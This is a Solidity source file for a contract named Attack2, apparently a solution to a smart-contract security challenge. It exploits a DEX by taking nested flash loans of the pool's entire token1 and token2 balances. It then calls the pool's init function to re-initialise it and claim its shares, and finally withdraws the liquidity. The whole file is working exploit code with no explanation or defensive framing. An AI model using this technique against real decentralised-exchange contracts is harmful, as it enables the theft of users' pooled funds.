pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface DEX {
    function token1() external returns (address);

    function token2() external returns (address);

    function totalShares() external returns (uint256);

    function shares(address) external returns (uint256);

    function init(uint256, uint256) external;

    function swap(
        address,
        uint256,
        address,
        uint256
    ) external;

    function addLiquidity(uint256) external;

    function removeLiquidity(uint256) external;

    function flashLoan(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bool);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract Attack2 {
    IERC20 token1;
    IERC20 token2;
    DEX dex;

    constructor(
        IERC20 token1_,
        IERC20 token2_,
        DEX dex_
    ) {
        token1 = token1_;
        token2 = token2_;
        dex = dex_;
    }

    function startExploit() public {
        uint256 token1Balance = token1.balanceOf(address(dex));
        dex.flashLoan(
            address(this),
            address(token1),
            token1Balance,
            abi.encode(1)
        );
        dex.removeLiquidity(1);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        uint256 s = abi.decode(data, (uint256));

        if (s == 1) {
            uint256 token2Balance = token2.balanceOf(address(dex));
            dex.flashLoan(
                address(this),
                address(token2),
                token2Balance,
                abi.encode(2)
            );
        } else {
            token1.approve(address(dex), 1);
            token2.approve(address(dex), 1);

            dex.init(1, 1);
        }
        IERC20(token).approve(address(dex), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
